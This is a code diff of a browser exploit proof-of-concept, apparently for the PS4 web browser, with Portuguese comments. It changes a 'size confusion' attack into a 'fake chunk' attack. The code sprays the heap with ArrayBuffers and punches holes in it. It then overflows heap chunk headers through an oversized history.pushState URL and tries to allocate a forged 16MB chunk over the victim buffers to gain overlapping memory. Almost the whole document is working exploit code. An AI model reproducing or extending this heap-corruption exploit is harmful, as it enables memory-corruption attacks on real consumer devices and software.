@@ -1,78 +1,64 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Size Confusion PoC</title>
+    <title>PS4 Fake Chunk Attack</title>
     <style>
-        body { background-color: #2b1100; color: #ffaa00; font-family: monospace; padding: 20px; text-align: center; }
-        button { 
-            font-size: 24px; padding: 25px; width: 100%; border: 2px solid #ffaa00; background: #000; color: #fff; font-weight: bold; cursor: pointer;
-        }
-        #log { text-align: left; margin-top: 20px; border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; background: #111;}
-        .win { background-color: #ffaa00; color: #000; font-weight: bold; font-size: 1.2em; padding: 5px;}
+        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
+        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer; }
+        #log { margin-top: 20px; border: 1px solid #333; padding: 10px; color: cyan; height: 300px; overflow-y: scroll; }
     </style>
 </head>
 <body>
 
-    <h1>Confusão de Tamanho (Header Corruption)</h1>
-    <p>Tentando enganar o alocador mudando o tamanho do bloco para 0x01.</p>
+    <h1>Ataque de Chunk Falso (16MB)</h1>
+    <p>Teoria: Transformamos o vizinho em um bloco livre de 16MB.</p>
 
-    <button onclick="startConfusion()">INICIAR CONFUSÃO</button>
-    
+    <button onclick="startFakeChunk()">ALOCAR 16MB NO CHUNK FALSO</button>
     <div id="log">Pronto. Reinicie o console.</div>
 
     <script>
-        const ALIGNED_OFFSET = 709520; // O início do cabeçalho que descobrimos
-        const OVERFLOW_AMT = 32;       // Só precisamos corromper o cabeçalho, não muitos dados
+        const ALIGNED_OFFSET = 709520;
+        // Overflow suficiente para cobrir alguns cabeçalhos (64KB)
+        const OVERFLOW_AMT = 1024 * 64; 
+        
+        // O valor 0x01010101 é aprox 16MB.
+        // Vamos tentar alocar um buffer desse tamanho.
+        const FAKE_SIZE = 16843009; 
 
-        // Tamanho médio (64KB) - Foge do IsoHeap de pequenos objetos
-        const TARGET_SIZE = 0x10000; 
-        const SPRAY_COUNT = 500;
-
-        var victims = [];
-
-        function log(msg, type) {
-            const el = document.getElementById('log');
-            let style = type === 'win' ? 'class="win"' : '';
-            el.innerHTML += `<div ${style}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-            el.scrollTop = el.scrollHeight;
+        function log(msg) {
+            document.getElementById('log').innerHTML += `<div>${msg}</div>`;
         }
 
-        async function startConfusion() {
-            log(`1. Alocando ${SPRAY_COUNT} buffers de 64KB...`);
+        async function startFakeChunk() {
+            log("1. Preparando terreno (Heap Spray leve)...");
             
-            // FASE 1: SPRAY
-            for(let i=0; i<SPRAY_COUNT; i++) {
-                let ab = new ArrayBuffer(TARGET_SIZE);
+            // Cria alguns arrays para servirem de "vitima de sobreposição"
+            var victims = [];
+            for(let i=0; i<100; i++) {
+                let ab = new ArrayBuffer(1024 * 128); // 128KB
                 let view = new Uint8Array(ab);
-                view[0] = 0xAA; // Marca original
+                view[0] = 0xAA; // Marca
                 victims.push(ab);
             }
 
-            // Buracos para o exploit cair
-            log("2. Criando buracos...");
-            for(let i=0; i<SPRAY_COUNT; i+=2) {
-                victims[i] = null;
-            }
+            // Cria buracos
+            for(let i=0; i<100; i+=2) victims[i] = null;
+            
+            // Força GC para que os buracos virem "Free Chunks"
             await forceGC();
 
-            // FASE 2: EXPLOIT (Corromper Header)
-            log("3. Disparando Overflow no Header Vizinho...");
+            log("2. Disparando Exploit (Criando Fake Chunk)...");
             
             setTimeout(() => {
                 try {
-                    // Preenche até o cabeçalho e escreve 0x0101...
+                    // Escreve 0x01010101 nos cabeçalhos livres
                     let buffer = "A".repeat(ALIGNED_OFFSET);
                     buffer += "\x01".repeat(OVERFLOW_AMT);
+                    
+                    history.pushState({}, "fake_chunk", "/" + buffer);
 
-                    // Dispara
-                    history.pushState({}, "size_conf", "/" + buffer);
-
-                    // FASE 3: RE-ALOCAÇÃO
-                    // Se corrompemos o header de uma vítima viva (impar), 
-                    // o sistema pode achar que aquele espaço está livre ou tem tamanho errado.
-                    // Vamos tentar alocar Strings em cima.
-                    log("4. Tentando alocar Strings sobre os buffers...");
-                    allocOverlaps();
+                    log("3. Solicitando alocação de ~16MB...");
+                    attemptBadAlloc(victims);
 
                 } catch (e) {
                     log("Erro: " + e.message);
@@ -80,45 +66,41 @@
             }, 500);
         }
 
-        function allocOverlaps() {
-            // Criamos strings do mesmo tamanho (64KB)
-            // Se houver confusão, a string vai sobrescrever os dados do ArrayBuffer
-            let pad = "S".repeat(TARGET_SIZE - 100);
-            let overlaps = [];
-
-            for(let i=0; i<SPRAY_COUNT; i++) {
-                overlaps.push(pad + i);
-            }
-
-            log("5. Verificando overlap...");
-            checkOverlap();
-        }
-
-        function checkOverlap() {
-            let success = false;
-
-            // Checa os ArrayBuffers originais que sobraram (impares)
-            for(let i=1; i<victims.length; i+=2) {
-                let v = victims[i];
-                if(!v) continue;
-
-                let view = new Uint8Array(v);
+        function attemptBadAlloc(victims) {
+            try {
+                // Aqui está o segredo: Pedimos o tamanho exato que forjamos
+                let ghostBuffer = new ArrayBuffer(FAKE_SIZE);
+                let ghostView = new Uint8Array(ghostBuffer);
                 
-                // Se o primeiro byte mudou de 0xAA para 'S' (0x53), temos overlap!
-                if (view[0] === 0x53) {
-                    log(`!!! SUCESSO !!! Buffer ${i} invadido por String!`, 'win');
-                    alert("OVERLAP ACHIEVED!");
-                    success = true;
-                    break;
-                }
-                // Se mudou para 0x01, pegamos o overflow direto
-                if (view[0] === 0x01) {
-                    log(`Atingido por Overflow direto (0x01) no index ${i}.`, 'win');
-                }
-            }
+                // Se o sistema nos deu o bloco falso, esse bloco vai estar 
+                // "em cima" das vítimas que sobraram (0xAA).
+                
+                log("Alocação bem sucedida! Verificando sobreposição...");
+                
+                // Escrevemos no buffer fantasma
+                ghostView[0] = 0xFF;
+                ghostView[1000] = 0xFF;
+                ghostView[100000] = 0xFF;
 
-            if(!success) {
-                log("Nenhum overlap. O sistema protegeu os blocos.");
+                // Verificamos se as vítimas mudaram
+                let success = false;
+                for(let i=1; i<victims.length; i+=2) {
+                    let v = victims[i];
+                    if(!v) continue;
+                    
+                    let view = new Uint8Array(v);
+                    if (view[0] !== 0xAA) {
+                        log(`<h1 style='color:red'>!!! SUCESSO !!! Vítima ${i} atropelada!</h1>`);
+                        alert("FAKE CHUNK OVERLAP!");
+                        success = true;
+                        break;
+                    }
+                }
+                
+                if(!success) log("Alocação ocorreu, mas não achamos a sobreposição.");
+
+            } catch(e) {
+                log("Alocação falhou (O sistema percebeu o erro?): " + e.message);
             }
         }
 
